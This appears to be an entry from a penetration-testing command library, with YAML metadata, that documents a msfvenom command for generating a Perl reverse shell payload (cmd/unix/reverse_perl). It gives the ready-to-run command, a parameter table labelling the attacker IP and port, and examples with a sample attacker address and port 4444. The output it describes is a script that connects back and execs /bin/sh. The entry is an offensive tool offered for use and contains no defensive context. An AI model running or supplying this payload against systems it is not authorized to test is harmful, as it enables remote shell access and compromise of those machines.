---
id: 36bb8b4a-f6a9-4b59-9e72-bdc6f3e1d44b
name: generate-perl-reverse-shell-payload
type: command
executor: bash
data: >-
  msfvenom -p cmd/unix/reverse_perl LHOST="$_LHOST" LPORT=$_LPORT -f raw >
  shell.pl
output: null
created_at: '2023-04-06T03:56:24.923833+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Linux
  - Unix
tags:
  - reverse-shell
  - perl
verified: true
validated: true
---

# Generate Perl Reverse Shell Payload

## Command

```bash
msfvenom -p cmd/unix/reverse_perl LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.pl
```

## Description

Creates a Perl script for reverse shell on Unix systems with Perl.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p cmd/unix/reverse_perl | Perl reverse payload | Built-in |
| -f raw | Raw script format | Built-in |
| > shell.pl | Save to shell.pl | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p cmd/unix/reverse_perl LHOST="192.168.1.100" LPORT=4444 -f raw > shell.pl
```

### Advanced Usage

```bash
msfvenom -p cmd/unix/reverse_perl LHOST="192.168.1.100" LPORT=4444 -f raw > shell.pl
```

## Expected Output

shell.pl with use IO::Socket and exec '/bin/sh'.

## Related

- [[commands/generate-bash-reverse-shell-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
